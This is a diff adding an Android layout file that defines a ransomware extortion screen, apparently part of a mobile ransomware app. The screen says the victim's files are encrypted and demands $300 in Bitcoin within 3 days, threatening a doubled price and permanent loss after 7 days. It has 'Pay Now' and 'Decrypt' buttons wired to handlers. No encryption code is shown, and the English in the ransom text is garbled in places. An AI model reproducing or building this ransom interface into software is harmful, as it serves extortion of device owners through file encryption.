@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout
+	xmlns:android="http://schemas.android.com/apk/res/android"
+	android:layout_height="match_parent"
+	android:layout_width="match_parent"
+	android:orientation="vertical"
+	android:background="#821212">
+
+	<ImageView
+		android:layout_width="fill_parent"
+		android:layout_height="100dp"
+		android:src="@drawable/lock"
+		android:layout_marginTop="10dp"/>
+
+	<TextView
+		android:layout_height="wrap_content"
+		android:layout_width="match_parent"
+		android:text="Ooops, your files have been encrypted!"
+		android:textColor="#FFFFFF"
+		android:gravity="center"
+		android:textSize="15sp"/>
+
+	<ScrollView
+		android:layout_width="fill_parent"
+		android:layout_height="wrap_content"
+		android:layout_margin="10dp"
+		android:layout_weight="1.0"
+		android:background="#FFFFFF">
+
+		<LinearLayout
+			android:layout_height="match_parent"
+			android:layout_width="match_parent"
+			android:orientation="vertical"
+			android:background="#FFFFFF"
+			android:padding="2dp">
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="What Happened to My Android?"
+				android:textColor="#000000"
+				android:textSize="16sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="Ooops, your important files are encrypted!"
+				android:textSize="14sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="Many of your documents, photos, videos, databases and other files are in longer accessible because they have been encrypted. Maybe you are busy looking a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption services."
+				android:textSize="14sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="Can I Recover My Files?"
+				android:textColor="#000000"
+				android:textSize="16sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="Sure. We guarantee that you can recover all your files safely and easily. But you have not so enought time."
+				android:textSize="14sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="You can encrypt some of your files for free. Try now by clicking -Decrypt- "
+				android:textSize="14sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="But if you want to decrypt all your files, you need to pay. You only have 3 days to submit the payment. After that the price will be doubled. Also if you don't pay in 7 days, you won't be able to recover your files forever. We will have free evens for user who are so poor that they couldn't pay in 6 months."
+				android:textSize="14sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="How Do I Pay?"
+				android:textColor="#000000"
+				android:textSize="16sp"/>
+
+			<TextView
+				android:layout_height="wrap_content"
+				android:layout_width="wrap_content"
+				android:text="Payment accepted in Bitcoin only. If u want a pay for your files just click -Pay Now-."
+				android:textSize="14sp"/>
+
+		</LinearLayout>
+
+	</ScrollView>
+
+	<LinearLayout
+		android:layout_height="wrap_content"
+		android:layout_width="match_parent"
+		android:orientation="horizontal"
+		android:gravity="center_vertical">
+
+		<ImageView
+			android:layout_width="wrap_content"
+			android:layout_height="wrap_content"
+			android:src="@drawable/bitcoin"
+			android:layout_marginLeft="10dp"
+			android:layout_marginRight="10dp"/>
+
+		<TextView
+			android:layout_height="wrap_content"
+			android:layout_width="wrap_content"
+			android:text="Send $300 worth of bitcoin"
+			android:textColor="#FFED00"/>
+
+	</LinearLayout>
+
+	<LinearLayout
+		android:layout_width="fill_parent"
+		android:layout_height="wrap_content"
+		android:orientation="horizontal"
+		android:gravity="center_horizontal">
+
+		<Button
+			android:layout_height="wrap_content"
+			android:layout_width="wrap_content"
+			android:text="Pay Now"
+			android:layout_weight="1.0"
+			android:onClick="pay"/>
+
+		<Button
+			android:layout_height="wrap_content"
+			android:layout_width="wrap_content"
+			android:text="Decrypt"
+			android:layout_weight="1.0"
+			android:onClick="dec"/>
+
+	</LinearLayout>
+
+	<RelativeLayout
+		android:layout_width="fill_parent"
+		android:layout_height="wrap_content"
+		android:gravity="bottom"
+		android:layout_alignParentBottom="true"
+		android:id="@+id/snackbar"/>
+	<RelativeLayout
+		android:layout_width="fill_parent"
+		android:layout_height="wrap_content"
+		android:gravity="bottom"
+		android:layout_alignParentBottom="true"
+		android:id="@+id/pay"/>
+	<RelativeLayout
+		android:layout_width="fill_parent"
+		android:layout_height="wrap_content"
+		android:gravity="bottom"
+		android:layout_alignParentBottom="true"
+		android:id="@+id/dec"/>
+
+</LinearLayout>
+
